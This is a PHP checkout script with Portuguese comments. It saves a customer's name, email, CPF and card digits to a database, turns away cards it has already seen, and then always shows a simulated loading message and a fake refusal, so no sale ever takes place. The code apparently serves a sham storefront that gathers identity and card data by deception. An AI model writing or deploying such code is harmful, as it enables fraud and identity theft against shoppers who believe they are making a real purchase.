<?php
session_start();
include 'conexao.php';  // Arquivo que faz a conexão com o banco de dados

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recebe os dados do cliente
    $nome_completo = $_POST['nome_completo'];
    $email = $_POST['email'];
    $cpf = $_POST['cpf'];
    $cartao = $_POST['cartao'];  // Últimos 4 dígitos do cartão

    // Verifica se o cartão já foi usado
    $cartao_query = $conn->prepare("SELECT * FROM cartoes WHERE ultimo_cartao = ?");
    $cartao_query->bind_param("s", $cartao);
    $cartao_query->execute();
    $cartao_result = $cartao_query->get_result();

    if ($cartao_result->num_rows > 0) {
        // Se o cartão já foi usado, exibe erro e redireciona
        echo "<script>alert('Esse cartão já foi utilizado em uma compra anterior.'); window.location.href = 'checkout.html';</script>";
        exit;
    }

    // Insere os dados do cliente na tabela clientes
    $cliente_query = $conn->prepare("INSERT INTO clientes (nome_completo, email, cpf) VALUES (?, ?, ?)");
    $cliente_query->bind_param("sss", $nome_completo, $email, $cpf);
    $cliente_query->execute();
    $cliente_id = $cliente_query->insert_id;

    // Armazena os últimos 4 dígitos do cartão
    $cartao_query = $conn->prepare("INSERT INTO cartoes (cliente_id, ultimo_cartao) VALUES (?, ?)");
    $cartao_query->bind_param("is", $cliente_id, $cartao);
    $cartao_query->execute();

    // Simulação de "Carregando compra..." e recusa devido a muitos pedidos
    echo "<script>
            document.getElementById('status').innerText = 'Carregando compra...';
            setTimeout(function() {
                alert('Compra recusada devido a muitos pedidos sendo feitos. Tente novamente mais tarde.');
                window.location.href = 'index.html';
            }, 3000);  // Tempo de 3 segundos para simular o carregamento
          </script>";
}
?>
